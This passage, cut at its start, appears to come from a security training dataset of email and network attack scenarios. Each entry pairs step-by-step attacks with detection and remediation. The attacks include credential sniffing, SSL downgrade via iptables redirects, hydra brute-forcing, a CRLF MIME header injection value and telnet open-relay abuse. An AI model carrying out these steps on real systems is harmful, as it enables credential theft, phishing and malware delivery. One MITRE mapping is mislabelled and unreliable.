Vulnerability: Weak parsing logic and header validation
Impact: Spoofed trusted sources bypassing security filters
Detection Method: Header anomaly detection in mail gateways
Solution: Strict mail server config, disable raw input injection
Tags: Header Injection, SPF Bypass, DKIM Spoof

Title: Injecting Malicious Attachments via SMTP Header Control
Scenario Description: Attacker adds headers to manipulate MIME boundaries and smuggle malicious attachments undetected.
Attack Steps: Step 1: Craft a raw email file with malicious content (e.g., calc.exe) embedded in a forged MIME part. Step 2: Inject headers like: Content-Type: multipart/mixed; boundary=attackerBoundary%0A--attackerBoundary%0AContent-Disposition: attachment; filename=invoice.exe Step 3: Use a compromised web form or SMTP relay to send the crafted message. Step 4: On the receiving side, open the email and note the executable attachment. Step 5: Monitor behavior after opening, such as process execution or system changes.
Vulnerability: Improper MIME handling, weak header filtering
Impact: Malware delivery via trusted SMTP relay
Detection Method: Antivirus alerts, MIME boundary analysis
Solution: Disable execution of dangerous file types, scan MIME structure

Title: Capturing POP3 Credentials via LAN ARP Spoofing
Scenario Description: An attacker in the same network uses ARP spoofing to become a MITM and capture credentials transmitted via unencrypted POP3.
Attack Steps: Step 1: Connect attacker and victim systems to the same LAN.Step 2: Run Ettercap in ARP spoofing mode to intercept victim’s network traffic.Step 3: Ensure victim email client (e.g., Thunderbird) connects to mail server using POP3 (port 110).Step 4: Monitor traffic on port 110 using Wireshark.Step 5: Extract the victim’s username and password in plain text from the POP3 communication.Step 6: Log in to test POP3 mail server using the intercepted credentials.
Vulnerability: Lack of encryption on internal POP3 traffic
Detection Method: Network ARP monitoring, MAC duplication detection
Solution: Use encrypted POP3 (port 995), ARP spoofing protection

Title: IMAP Login Credential Capture from Mobile Devices on Public Wi-Fi
Scenario Description: Attacker targets mobile devices using public Wi-Fi that connect to mail servers using plain IMAP.
Attack Steps: Step 1: Setup open Wi-Fi hotspot using a laptop with internet forwarding.Step 2: Connect a mobile device configured with an email client (e.g., Gmail app using IMAP) to this hotspot.Step 3: Start MITMproxy or Wireshark to monitor traffic on the network.Step 4: Watch for outbound IMAP connections on port 143.Step 5: If credentials are sent unencrypted, extract the username and password.Step 6: Log in to the target mailbox using those credentials (test server only).
Detection Method: Public Wi-Fi anomaly detection, DNS over HTTPS monitoring
Solution: Enforce STARTTLS or IMAPS, disable plaintext IMAP

Title: IMAP Credential Brute Force via Weak Passwords
Scenario Description: Attacker performs a brute-force attack over IMAP to guess email account credentials.
Attack Steps: Step 1: Set up a fake IMAP mail server (e.g., Dovecot) with known usernames.Step 2: Use Hydra with wordlists to brute-force IMAP logins:hydra -L users.txt -P passwords.txt imap.testserver.com imapStep 3: Observe which credentials succeed.Step 4: Log into the mail client using cracked credentials.Step 5: Demonstrate reading and sending of emails via the test server.
Detection Method: Detect repeated failed login attempts
Solution: Use MFA, lockout policies, strong password enforcement

Title: POP3 Credential Theft via Transparent Proxy Injection
Scenario Description: Attacker sets up a transparent proxy to intercept POP3 connections and log credentials.
Attack Steps: Step 1: Configure a Linux machine to act as a transparent proxy using Squid and iptables.Step 2: Redirect all outbound POP3 traffic (port 110) through Squid proxy.Step 3: Connect a test client email app to a POP3 server over plaintext.Step 4: Monitor Squid logs or Wireshark to capture and extract credentials.Step 5: Validate by logging in to the test server using stolen credentials.
Vulnerability: Lack of secure transmission in plaintext protocols
Detection Method: Detect transparent proxy interception, odd routing
Solution: Force TLS, use secure VPN or encrypted POP3

Title: IMAP Credential Leakage via Email Client Autodiscover Flaw
Scenario Description: Exploiting misconfigured email client autodiscover feature to redirect credentials to attacker.
Attack Steps: Step 1: Set up a fake DNS server (using DNSmasq) that resolves autodiscover.* to attacker IP.Step 2: Run a rogue IMAP server to collect credentials (e.g., MailCatcher).Step 3: On victim system, open an email client that uses autodiscover (e.g., Outlook).Step 4: When client attempts autodiscover, attacker responds with malicious IMAP server details.Step 5: Client sends credentials to attacker’s server, which are logged.Step 6: Log into real email server to demonstrate credential misuse (test only).
Detection Method: Monitor unexpected DNS lookups, config changes
Solution: Block external autodiscover paths, enforce cert pinning

Title: Credential Replay via Captured IMAP Authentication
Scenario Description: Attacker reuses intercepted IMAP login credentials from one session to authenticate another.
Attack Steps: Step 1: Capture IMAP credentials using previous sniffing technique (e.g., Wireshark on port 143).Step 2: Note down username and password from captured session.Step 3: Open Telnet or netcat and manually connect to IMAP server:telnet imap.server.com 143Step 4: Use captured credentials to authenticate:A LOGIN user@example.com password123Step 5: Browse mailbox via IMAP commands (e.g., LIST, SELECT, FETCH).Step 6: Demonstrate data extraction or spoofed read status.
MITRE Technique: T1558.003 (Steal or Forge Kerberos Tickets → replay variant)
Detection Method: Session monitoring, device/IP change alerts
Solution: Token-based auth, enforce MFA, TLS-only IMAP

Title: IMAP Credential Theft via Malicious Captive Portal
Scenario Description: Attacker uses a fake captive portal to mimic public Wi-Fi login and trick users into entering IMAP credentials.
Attack Steps: Step 1: Create a fake Wi-Fi network using hostapd and configure it with open authentication (no password).Step 2: Host a captive portal that looks like a corporate webmail login page.Step 3: When victim connects, automatically redirect them to the login page using dnsmasq or browser redirection.Step 4: Victim enters email and password, thinking it’s needed to access Wi-Fi or email.Step 5: Credentials are logged on attacker's backend (e.g., Flask app).Step 6: Use credentials to connect to test IMAP server and demonstrate unauthorized access.
Detection Method: Monitor for DNS redirection, fake captive portal detection
Solution: Enforce VPN on public Wi-Fi, train users to verify login URLs

Title: Transparent POP3 Proxy with Certificate Downgrade
Scenario Description: Attacker intercepts POP3 over SSL and downgrades the connection to capture plaintext credentials.
Attack Steps: Step 1: Set up a machine to act as transparent proxy with IP forwarding and iptables.Step 2: Redirect POP3 SSL port 995 traffic to port 110:iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-port 110Step 3: Start sslstrip to manipulate SSL certificates.Step 4: Have the victim use a POP3 client (e.g., Outlook) configured to use port 995 (SSL).Step 5: sslstrip downgrades the connection silently.Step 6: tcpdump or Wireshark is used to capture plaintext login credentials.Step 7: Log in using intercepted credentials.
Detection Method: Unusual port mapping detection, client cert errors
Solution: Enforce strict SSL pinning, block port redirection

Title: IMAP Credential Leakage via Browser Auto-Completion
Scenario Description: Attacker tricks victim browser into auto-filling IMAP credentials into a fake form.
Attack Steps: Step 1: Host a webpage with a fake IMAP login form with same field names as actual email client login pages.Step 2: Embed JavaScript that auto-focuses the form and waits for autofill.Step 3: Share the link with victim via phishing email or QR code near a coffee shop.Step 4: Victim’s browser autofills stored credentials into the form.Step 5: JavaScript sends credentials silently to attacker’s server.Step 6: Use credentials to log in to IMAP server in test environment.
Detection Method: Monitor unexpected credential submission, browser warnings
Solution: Disable autofill for sensitive fields

Title: POP3 Credential Interception via ISP Proxy Manipulation
Scenario Description: Attacker uses rogue ISP or upstream proxy to inject malicious responses in POP3 negotiation.
Attack Steps: Step 1: Simulate a compromised ISP or malicious hotspot with routing control.Step 2: Redirect traffic for POP3 port 110 to a rogue server.Step 3: When user connects, the rogue server mimics a real POP3 login prompt.Step 4: User inputs their email and password believing they’re connecting to their provider.Step 5: Log credentials and terminate connection with an error.Step 6: Reuse credentials to access victim mailbox.Step 7: Log all actions and reset credentials after simulation.
Detection Method: Traffic flow anomalies, rogue server detection
Solution: DNSSEC, endpoint SSL validation

Title: IMAP Credential Phishing via Malicious QR Code in Office
Scenario Description: Attacker leaves printed phishing QR codes linking to fake IMAP webmail login pages.
Attack Steps: Step 1: Generate a phishing webmail login page hosted on a local server.Step 2: Create a QR code that links to this fake login page.Step 3: Print and label the QR code as “Quick Access to Email” and stick it in office/lab.Step 4: Victim scans the QR using their phone, opens fake login page.Step 5: Victim inputs credentials believing it is real webmail.Step 6: Log credentials and redirect to error page.Step 7: Log into IMAP mail server with captured credentials in lab.
Detection Method: Scan for unknown QR codes, log unexpected submissions
Solution: Educate users, scan QR safely, HSTS policies

Title: IMAP Credential Stealing via Fake Email Configuration App
Scenario Description: Attacker creates a fake app that claims to configure email access and steals credentials.
Attack Steps: Step 1: Develop a fake Android app called “Secure Email Configurator.”Step 2: Embed a form that asks for IMAP/SMTP credentials.Step 3: Host it on a local APK store or hand it out on USB in classroom.Step 4: Victim installs the app and enters credentials thinking it sets up their email.Step 5: App sends credentials to attacker’s server.Step 6: Log into IMAP test mail server and demonstrate access.
Detection Method: Mobile MDM alerting, unknown app install detection
Solution: Disable sideloading, use only signed apps

Title: Passive Credential Interception Using WiFi Pineapple
Scenario Description: Attacker uses WiFi Pineapple to impersonate trusted SSIDs and intercept email credentials.
Attack Steps: Step 1: Configure Pineapple to clone known SSIDs (e.g., “OfficeWiFi”).Step 2: Enable logging and monitor POP3 and IMAP ports (110, 143).Step 3: Victim’s device auto-connects and attempts to sync email.Step 4: Credentials sent without encryption are logged.Step 5: View logs or use tcpdump to isolate password strings.Step 6: Test login to local email server.
Detection Method: Detect duplicate SSIDs, WiFi anomaly detection
Solution: Disable auto-connect, enforce SSL-only

Title: IMAP Credential Abuse via DNS Rebinding
Scenario Description: Attacker uses DNS rebinding to bypass internal firewall and reach IMAP interface.
Attack Steps: Step 1: Create a webpage that uses JavaScript to open IMAP connection.Step 2: Configure DNSChef to resolve a public domain to a private IP (e.g., 192.168.1.10).Step 3: Host the page on a remote server.Step 4: Victim opens the page; after DNS rebinding, script sends IMAP credentials stored locally (simulate with dummy cookies).Step 5: Server receives and logs them.Step 6: Use credentials to log into private IMAP service.
Detection Method: DNS rebinding alerts, firewall logs
Solution: Implement DNS rebinding protection

Title: POP3 Credential Theft via Compromised Email Backup Tool
Scenario Description: Attacker modifies an open-source mail backup tool to log credentials and distribute it.
Attack Steps: Step 1: Clone an open-source tool (like mail-backup) that requires POP3 login.Step 2: Add a few lines of code to silently write credentials to a hidden file or remote server.Step 3: Distribute the script in a simulated classroom environment or GitHub.Step 4: Victim runs it to backup emails.Step 5: Script logs credentials.Step 6: Use these to demonstrate unauthorized access to POP3 server.
Detection Method: Static code analysis, tool audit
Solution: Verify code integrity, signed scripts

Title: IMAP Credential Leak from Browser Extension Sync
Scenario Description: A malicious browser extension monitors sync traffic and intercepts email credentials.
Attack Steps: Step 1: Create a fake browser extension claiming to improve mail readability.Step 2: Once installed, monitor fetch/XHR requests for IMAP login payloads.Step 3: When user logs in to webmail client, intercept credentials via script injection.Step 4: Log credentials and send to attacker-controlled server.Step 5: Use credentials to log into IMAP server.Step 6: Demonstrate inbox compromise.
Detection Method: Browser extension audit, sandboxing
Solution: Restrict extension access, verify dev identity

Title: Unencrypted IMAP Credential Sniffing
Scenario Description: The attacker captures credentials from an email client communicating over IMAP on an unencrypted network.
Attack Steps: Step 1: Set up a Wi-Fi hotspot using a laptop or Raspberry Pi.Step 2: Connect the victim device (test machine) to the fake Wi-Fi network.Step 3: Open an email client (like Thunderbird) on the victim machine and configure it to connect to a test mail server over unencrypted IMAP (port 143).Step 4: On the attacker machine, open Wireshark and filter for IMAP traffic (tcp.port == 143).Step 5: Observe the captured traffic to extract email credentials sent in clear text.Step 6: Use the credentials to log into the test mail server and access inbox.
Detection Method: Monitor logs for login attempts from rogue IPs, traffic capture detection
Solution: Enforce IMAPS (port 993), block unencrypted traffic

Title: POP3 Password Interception via Rogue AP
Scenario Description: An attacker sets up a rogue wireless access point and intercepts POP3 login credentials from email clients.
Attack Steps: Step 1: Configure a rogue Wi-Fi hotspot with same SSID as legitimate network.Step 2: Use Bettercap to create a man-in-the-middle environment and capture traffic.Step 3: Encourage the victim device to connect to the fake AP (disable other known networks).Step 4: On victim system, use a POP3 client like Outlook Express to connect to the mail server (plaintext, port 110).Step 5: On the attacker system, capture traffic using Wireshark with filter tcp.port == 110.Step 6: Decode and extract the username and password from packet payload.Step 7: Use credentials to demonstrate inbox access.
Detection Method: Wi-Fi anomaly detection, multiple AP scanning
Solution: Use SSL/TLS (port 995) for POP3, disable open Wi-Fi

Title: Exploiting Misconfigured IMAPS with SSL Downgrade
Scenario Description: Attacker forces a downgrade from encrypted IMAPS to plaintext IMAP, capturing credentials in transit.
Attack Steps: Step 1: Set up a Kali Linux attacker system with SSLstrip and iptables redirection.Step 2: Redirect port 993 (IMAPS) to 143 (IMAP) using iptables:iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-port 143Step 3: Launch SSLstrip to intercept connections.Step 4: Connect the test email client to the fake mail server over IMAPS.Step 5: SSLstrip downgrades the connection, credentials sent in plaintext are captured.Step 6: Analyze traffic via Wireshark to extract username/password.Step 7: Use captured credentials to log in to mailbox.
Detection Method: Monitor SSL certificate anomalies, downgrade attempts
Solution: Enforce HSTS, disable fallback to insecure ports

Title: IMAP Credential Harvesting via Phishing Configuration File
Scenario Description: Attacker sends a fake configuration file to users, which reroutes IMAP server settings to a malicious server.
Attack Steps: Step 1: Use SET to craft a fake configuration file (autodiscover.xml or .mobileconfig for iOS).Step 2: Email the configuration file with a message like “Update your mail settings for improved security.”Step 3: On victim system, open the file and allow changes to email settings.Step 4: Email client is reconfigured to use attacker-controlled IMAP server.Step 5: Victim tries to log in, credentials are sent to attacker's server.Step 6: On attacker server (e.g., MailCatcher), credentials are logged.Step 7: Use them to access actual mail server or simulate compromise.
Detection Method: Alert on config changes, unusual server domains
Solution: DNS pinning, educate users on config file risks

Title: Malicious PDF Link Triggering RCE
Scenario Description: The attacker sends an email with a PDF attachment. The PDF has a link that appears benign but redirects to a server hosting an RCE vulnerability exploit (e.g., JavaScript abusing a browser plugin).
Tools Used: Social-Engineer Toolkit (SET), Malicious PDF Generator, Python SimpleHTTPServer
Attack Steps: Step 1: Attacker creates a malicious webpage with embedded JavaScript exploiting a known browser plugin vulnerability. Step 2: Attacker embeds the link to this malicious site into a PDF using tools like SET. Step 3: PDF is sent to the victim via a professional-looking phishing email. Step 4: Victim opens PDF and clicks the link, thinking it’s for an invoice or report. Step 5: Browser loads the malicious site. JavaScript runs in the background, initiating RCE. Step 6: Malicious code installs a remote backdoor on victim’s system silently.
Impact: Remote Code Execution, full system compromise
Detection Method: Endpoint monitoring, browser behavior logging, email attachment sandboxing
Solution: Patch browsers/plugins, disable macros and JavaScript in PDF viewers, use content filters

Title: Fake Google Doc Link Leading to Exploit Kit
Scenario Description: Victim receives an email appearing to come from a coworker, urging them to view a shared Google Doc. The link redirects to an exploit kit hosted on a malicious domain.
Tools Used: Gophish, Metasploit (Browser Exploit), Blackhole Exploit Kit
Attack Steps: Step 1: Attacker crafts a fake Google Docs sharing link, redirecting to a malicious domain. Step 2: Exploit kit (like Blackhole) is hosted on that domain and loaded with browser-based payloads. Step 3: Using Gophish, attacker creates a convincing spoofed email. Step 4: Victim clicks the fake doc link and lands on malicious site. Step 5: Exploit kit fingerprint’s browser for vulnerabilities and delivers payload (e.g., keylogger). Step 6: Malware installs silently in the background.
Detection Method: Domain reputation analysis, email spoof detection, browser sandboxing
Solution: URL filtering, staff training, update browsers, SPF/DKIM
Tags: Google Docs, Gophish, Metasploit, Exploit Kit

Title: Newsletter Subscription Phish with Auto-Download Payload
Scenario Description: Attacker mimics a known brand (e.g., Netflix) newsletter offering a new feature. The unsubscribe link is weaponized to download malware silently via a crafted URL.
Tools Used: Evilginx, BeEF, Malicious HTA/JS payload, Custom HTML Template
Attack Steps: Step 1: Attacker builds a fake newsletter email template mimicking a known service. Step 2: Includes "unsubscribe" link that leads to a malicious .hta or .js file hosted on attack server. Step 3: Email is distributed to large number of users via SMTP spoofing or mailer tool. Step 4: Victim clicks “unsubscribe” expecting to stop emails. Step 5: Malicious script executes automatically and downloads a trojan/stealer. Step 6: Malware silently installs and connects to attacker’s C2 server.
Detection Method: Email headers inspection, unsubscribe link analysis, EDR alerts
Solution: Disable auto script execution, email filtering, educate users on newsletter threats

Title: HTML Email with Hidden iFrame Drive-by
Scenario Description: HTML-formatted email contains a hidden iframe that auto-loads a malicious site in the background as soon as the email is previewed, triggering a browser exploit.
Tools Used: Email HTML Editor, Malicious Web Server, Browser Exploit Framework (BeEF)
Attack Steps: Step 1: Attacker crafts a rich HTML email with embedded hidden iframe <iframe style="display:none" src="malicious_site">. Step 2: The iframe source is set to a site hosting browser exploit payloads. Step 3: Victim receives the email and opens it in a preview pane (e.g., in Outlook). Step 4: The iframe is silently loaded by the email client, triggering JavaScript-based exploit. Step 5: Payload delivers and installs spyware/keylogger on victim system. Step 6: Attacker gets remote access or data logs.
Vulnerability: Email client rendering HTML with no security restrictions
MITRE Technique: T1204.002 – Malicious File Execution via Email
Detection Method: HTML sanitization, disable preview panes, IDS on iframe loads
Solution: Block HTML emails, restrict iframe usage, use plaintext email rendering

Title: Link to Fake Flash Player Update
Scenario Description: Victim is sent an email pretending to be from a video streaming service. The email says they need to "update Flash Player" to continue watching. The link leads to a fake update page that delivers malware.
Tools Used: SET, Fake Update Generator, .exe dropper, Gophish
Attack Steps: Step 1: Attacker creates a fake Flash update page with a malicious .exe pretending to be the installer. Step 2: Email is crafted to look like a message from a video streaming service. Step 3: The email includes a “Continue Watching” button that links to the fake update site. Step 4: Victim clicks the link and sees the fake update prompt. Step 5: Victim downloads and runs the fake installer. Step 6: Malware (e.g., RAT) installs and gives remote control to the attacker.
Detection Method: File execution monitoring, download reputation check
Solution: Block known update scams, disable admin rights for installs
Tags: flash, fake update, remote access tool

Title: Compromised WordPress Link via Newsletter
Scenario Description: A trusted email newsletter includes a link to a WordPress blog that has been compromised and injects malicious scripts into visitors' browsers.
Tools Used: WPScan, JavaScript payload, Email Marketing Spoofer
Attack Steps: Step 1: Attacker compromises an existing WordPress blog with low security (e.g., outdated plugins). Step 2: Attacker injects JavaScript code to load malware from a remote server. Step 3: Email newsletter is sent (or mimicked) containing a link to the compromised blog. Step 4: Victim receives and opens the email, clicking the link expecting to read a blog post. Step 5: Malicious script executes, dropping malware silently. Step 6: Attacker receives a reverse shell or steals browser session cookies.
Detection Method: Analyze external links in newsletters, detect JS anomalies
Solution: Monitor WordPress plugins, isolate newsletter links in sandbox
Tags: WordPress, JS inject, trusted source, drive-by

Title: LinkedIn Notification Clone with Exploit Link
Scenario Description: The attacker sends a fake LinkedIn notification email saying someone viewed the victim’s profile. The link redirects to a clone site that exploits browser vulnerability to drop spyware.
Tools Used: EvilURL, HTTrack Cloner, Malicious JS Payload
Attack Steps: Step 1: Attacker uses HTTrack to clone a real LinkedIn profile viewer page. Step 2: Malicious JavaScript is added to the clone to exploit browser flaws. Step 3: Email is spoofed to look like it came from LinkedIn. Step 4: Victim clicks the "See Who Viewed You" link. Step 5: Malicious clone site loads and triggers JavaScript execution in browser. Step 6: Spyware installs and starts logging keystrokes.
Vulnerability: Cloned domains, lack of browser hardening
Detection Method: Link scanning, browser behavior logging
Solution: Avoid clicking from email notifications, use direct login

Title: Fake Shipping Notification with Malicious Redirect
Scenario Description: An attacker impersonates a courier service (e.g., FedEx or DHL) in a shipping notification. The tracking link points to a malicious redirector that exploits browser bugs.
Tools Used: URL Redirect Generator, Browser Exploit Kit, SMTP Mailer
Attack Steps: Step 1: Attacker sets up a redirect chain that starts with a legit-looking site and ends at a malware host. Step 2: Email is composed using courier branding and fake tracking number. Step 3: Victim receives email stating "Your package is on the way!" with a "Track Now" button. Step 4: Victim clicks and is silently redirected through multiple sites until the final exploit loads. Step 5: Exploit delivers payload (e.g., credential stealer). Step 6: Victim sees a fake "delivery error" page while malware installs silently.
Detection Method: Redirect chain tracking, content security policy monitoring
Solution: Use tracking apps directly, disable JavaScript for email redirects

Title: YouTube Video Link with Exploit in Preview Image
Scenario Description: The attacker embeds a fake YouTube video preview in the email. Clicking it loads a lookalike page that auto-executes malicious code abusing HTML5 vulnerabilities.
Tools Used: HTML Email Composer, Malicious Video Preview Generator
Attack Steps: Step 1: Attacker creates a fake video thumbnail using YouTube’s branding. Step 2: Email contains the image linked to a malicious site imitating YouTube. Step 3: Victim clicks thumbnail expecting to watch a video. Step 4: The fake video site abuses HTML5 or browser bugs to run code silently. Step 5: Drive-by malware downloads in the background. Step 6: System becomes part of a botnet or C2 network.
Detection Method: Analyze HTML content, block suspicious video redirects
Solution: Educate on video link phishing, block media-based scripts

Title: Chat-Based Email with Malicious Preview URL
Scenario Description: A fake chat notification email mimics platforms like Slack or Teams. The preview link opens in the browser and auto-runs malicious code via WebAssembly payload.
Tools Used: Slack Email Cloner, Wasm Payload Builder, URL Shortener
Attack Steps: Step 1: Attacker builds a spoofed Slack/Teams chat notification email. Step 2: Link previews as a message thread but redirects to malicious site. Step 3: Victim clicks the chat link expecting to join a conversation. Step 4: Site loads WebAssembly code that performs malicious actions like system fingerprinting or payload download. Step 5: Malware executes or attacker gains session tokens. Step 6: Victim is unaware, browser shows a fake “loading chat…” screen.
Vulnerability: WebAssembly misuse, trust in chat apps
Detection Method: WebAssembly detection, link inspection
Solution: Ban WebAssembly in email-loaded pages, zero-trust link previews

Title: Online Invoice with Exploit Redirect
Scenario Description: The attacker sends a fake invoice email, claiming it's from a vendor. The “View Invoice” button leads to a drive-by malware site.
Tools Used: Zphisher, Fake Invoice Generator, Browser Exploit Kit
Attack Steps: Step 1: Attacker creates a professional-looking invoice PDF hosted on a fake website. Step 2: Uses tools like Zphisher to host a phishing page embedded with JavaScript-based browser exploits. Step 3: Sends spoofed email impersonating a known vendor or accounting department. Step 4: Email includes a large “View Invoice” button that links to the malicious site. Step 5: Victim clicks the link thinking it’s a legitimate invoice. Step 6: Their browser loads the exploit page, which silently checks for known vulnerabilities. Step 7: If a vulnerability is found, malware (like a keylogger) is downloaded and installed without the user knowing. Step 8: Attacker now gains access to credentials typed by the victim.
Detection Method: Browser sandboxing, email header checks
Solution: Educate users on invoice phishing, disable active JS in email browser previews

Title: Zoom Meeting Invite with Payload Drop
Scenario Description: Victim receives a fake Zoom meeting invite with a “Join Meeting” link. The link opens a fake Zoom page which auto-executes malicious payloads.
Tools Used: HTTrack Cloner, Metasploit Payloads, Zoom Template
Attack Steps: Step 1: Attacker clones Zoom’s meeting invite page using HTTrack. Step 2: Embeds Metasploit-generated payload (e.g., .hta or JavaScript) that runs on page load. Step 3: Email is spoofed to look like it’s coming from a boss or coworker. Step 4: Victim clicks on “Join Meeting” expecting to enter a video call. Step 5: Fake page opens and executes background JavaScript code to silently download a backdoor. Step 6: Malware installs and connects back to attacker’s server. Step 7: Attacker now has persistent access to the victim’s computer.
Detection Method: Monitor for outbound traffic to unknown IPs, analyze cloned sites
Solution: Educate users to verify meeting links; use calendar integrations only

Title: HR Survey with Fake OneDrive Link
Scenario Description: A fake HR policy update email includes a survey link hosted on a cloned OneDrive page that drops malware.
Tools Used: OneDrive Clone, Evilginx, Excel Survey Lure
Attack Steps: Step 1: Attacker clones Microsoft OneDrive login page and injects JavaScript loader. Step 2: Composes an email pretending to be HR asking employees to review new policies. Step 3: Includes a button “Open Survey” linking to the malicious OneDrive clone. Step 4: Victim clicks the link and is prompted to “log in to view file.” Step 5: Logging in submits credentials to attacker. Step 6: Meanwhile, the page also auto-downloads a hidden Excel file containing macro-based malware. Step 7: Victim opens file and macro executes, giving attacker access.
Vulnerability: Trust in cloud links, macro malware
Detection Method: URL sandboxing, macro detection in attachments
Solution: Use MFA, disable auto-macro execution

Title: Fake Charity Campaign Using Drive-by Malware
Scenario Description: The attacker exploits emotional appeal via a fake donation campaign. The "Donate Now" link triggers browser-based malware download.
Tools Used: Charity Template Generator, JavaScript Exploit, C2 Framework
Attack Steps: Step 1: Attacker builds a fake but professional donation page (e.g., for natural disaster). Step 2: Embeds JavaScript into the donate button which calls a hidden iframe loading exploit code. Step 3: Spoofs an NGO email with high-trust wording and branding. Step 4: Victim clicks “Donate Now” expecting a payment gateway. Step 5: JavaScript triggers download of a malicious file masked as a receipt. Step 6: Malware silently installs and begins beaconing to attacker’s command server.
Detection Method: Monitor donation-related traffic spikes, content filtering
Solution: Verify campaigns via official websites, block JS-based donation forms
Tags: charity, emotion, JS malware, social engineering

Title: Browser Extension Suggestion in Email
Scenario Description: The email claims to boost productivity with a new browser extension. The link installs a malicious browser extension that logs keystrokes.
Tools Used: Chrome Extension Generator, Phishing Email Composer
Attack Steps: Step 1: Attacker creates a browser extension with malicious JavaScript that logs form inputs and credentials. Step 2: Uploads it to a fake Chrome Web Store clone. Step 3: Email is crafted urging the recipient to “Try Our New Productivity Tool.” Step 4: Victim clicks the link and lands on the fake store. Step 5: Installs the extension believing it's from a real developer. Step 6: Extension runs in background and captures login details from popular websites.
Detection Method: Monitor browser extension installations, endpoint alerts
Solution: Only allow pre-approved extensions via admin policy

Title: Internal IT Survey with Malware
Scenario Description: Internal-looking email from "IT support" links to a survey that auto-executes a dropper when accessed.
Tools Used: Malicious Form Builder, Dropper Generator, URL Tracker
Attack Steps: Step 1: Attacker creates a web survey form asking IT satisfaction questions. Step 2: Behind the form, embedded JavaScript is set to drop a .vbs payload. Step 3: Email pretends to come from internal IT asking staff to help improve IT support. Step 4: Victim clicks “Take the Survey.” Step 5: Webpage loads, and script executes automatically downloading malware to temp directory. Step 6: Victim unknowingly executes downloaded file when they later reboot or browse files.
Detection Method: Web-based behavior monitoring, script logging
Solution: Use zero-trust model for internal email, disable .vbs execution

Title: Conference Registration with Weaponized PDF Link
Scenario Description: Victim is sent a fake tech conference invite. The registration link leads to a malicious PDF that triggers code on open.
Tools Used: SET, Malicious PDF Builder, Exploit Server
Attack Steps: Step 1: Attacker creates PDF with embedded JavaScript and weaponized payload. Step 2: Hosts the file on a fake registration page. Step 3: Email invites the user to a relevant conference with a link to “Register Now.” Step 4: Victim clicks and downloads the PDF. Step 5: Victim opens the PDF to fill in registration info. Step 6: JavaScript inside PDF executes and downloads malware in background. Step 7: Victim remains unaware while malware installs.
Detection Method: PDF behavior analysis, endpoint detection
Solution: Disable JS in PDF readers, never auto-open PDFs

Title: Spotify Account Alert Phish
Scenario Description: Spoofed email claims someone logged into Spotify from another country. The “Review Activity” link points to a malware-laden site.
Tools Used: Spotify Clone, Credential Stealer, JavaScript Exploit
Attack Steps: Step 1: Clone Spotify’s security alert page. Step 2: Embed JavaScript to capture keystrokes and deliver background payload. Step 3: Send email with “Unusual Login Detected” header. Step 4: Victim clicks “Review Activity” link. Step 5: Page loads silently installs spyware. Step 6: Victim enters credentials which attacker captures. Step 7: Malware runs in background collecting audio or browsing history.
Detection Method: Browser behavior alerting, brand monitoring
Solution: Only check alerts from official apps/sites

Title: Drive-by Exploit via Quora Digest Email
Scenario Description: Victim receives fake Quora digest email with one malicious question redirecting to a payload host.
Tools Used: Fake Digest Generator, JS Exploit Kit, URL Obfuscator
Attack Steps: Step 1: Attacker creates a fake digest email with fake “You’ve been mentioned in a comment” content. Step 2: One link points to a drive-by malware host. Step 3: Victim believes it’s a real question or answer and clicks. Step 4: Redirector sends victim to exploit server. Step 5: Malware executes and installs an info-stealer. Step 6: User gets redirected again to the real Quora page to avoid suspicion.
Detection Method: Heuristic analysis, redirect chain inspection
Solution: Only allow trusted newsletters, disable link previews

Title: Travel Discount Link Phish with Fake Hotel Booking
Scenario Description: The attacker sends fake holiday travel deals. Clicking on “Book Now” opens a malicious hotel site with hidden code.
Tools Used: Travel Template Phisher, Browser Exploit Kit, Spoofed Booking Site
Attack Steps: Step 1: Attacker creates a fake hotel booking page that looks like Booking.com. Step 2: Embeds malicious iframe that loads browser exploit silently. Step 3: Sends travel offer email with a “50% off hotel” message. Step 4: Victim clicks “Book Now” expecting travel discount. Step 5: Site loads exploit which checks for unpatched browser. Step 6: Drops spyware to monitor banking sessions.
Detection Method: Block iframe injection, domain validation
Solution: Avoid deal links, verify travel offers

Title: Open SMTP Relay Abuse
Scenario Description: Attacker exploits an open SMTP relay to send spam/phishing emails from the victim’s server
Attack Steps: Step 1: Use nmap to scan for port 25 on the target domain to check for SMTP service. Step 2: Use telnet targetdomain.com 25 to connect to the SMTP server. Step 3: Type HELO attacker.com and then MAIL FROM:<attacker@attacker.com>. Step 4: Type RCPT TO:<victim@somewhere.com>. If accepted, it's an open relay. Step 5: Type DATA and enter a phishing message. Step 6: Send the message and exit using . followed by QUIT. Step 7: Observe that the email is delivered from the victim’s server.
Impact: Spam/phishing emails sent from victim’s server
Detection Method: Monitor SMTP logs and volume anomalies
Solution: Disable open relay, enforce sender validation

Title: Directory Harvest via VRFY
Scenario Description: Attacker uses the SMTP VRFY command to enumerate valid users on an email server
Attack Steps: Step 1: Use nmap -p 25 targetdomain.com to check SMTP port. Step 2: Connect via telnet targetdomain.com 25. Step 3: Type HELO attacker.com to initiate session. Step 4: Run VRFY command like VRFY admin, VRFY john, VRFY mary. Step 5: If the server responds with “User exists”, note it down. Step 6: Compile a list of valid usernames for later attacks (e.g., brute-force or phishing).
Detection Method: Monitor VRFY command usage or disable it
Solution: Disable VRFY/EXPN commands in SMTP config

Title: Weak STARTTLS Downgrade
Scenario Description: Attacker forces email traffic to downgrade from encrypted STARTTLS to plaintext
Attack Steps: Step 1: Set up a man-in-the-middle proxy using mitmproxy or sslstrip. Step 2: Intercept traffic between email client and mail server. Step 3: Strip the STARTTLS command during SMTP handshake to prevent encryption. Step 4: Observe that the communication is now in plaintext. Step 5: Capture credentials or sensitive data using Wireshark. Step 6: Save captured credentials for replay or future misuse.
Detection Method: Analyze email headers for absence of STARTTLS
Solution: Enforce STARTTLS and DANE; disable plaintext fallback

Title: Autodiscover Info Leak
Scenario Description: Attacker captures sensitive credentials due to misconfigured Autodiscover settings in Outlook/Exchange
Attack Steps: Step 1: Set up a rogue web server with a wildcard domain like autodiscover.attacker.com. Step 2: Configure Responder to respond to incoming Autodiscover requests. Step 3: Trigger an Outlook/Exchange client to connect (can simulate in lab). Step 4: Outlook tries autodiscover.domain.com, then falls back to HTTP URLs. Step 5: The client sends credentials to attacker’s rogue Autodiscover server. Step 6: Use Responder/Burp to capture and extract base64-encoded credentials. Step 7: Decode and verify credentials for further misuse.
Detection Method: Monitor DNS and proxy logs
Solution: Patch Outlook client, block HTTP autodiscover

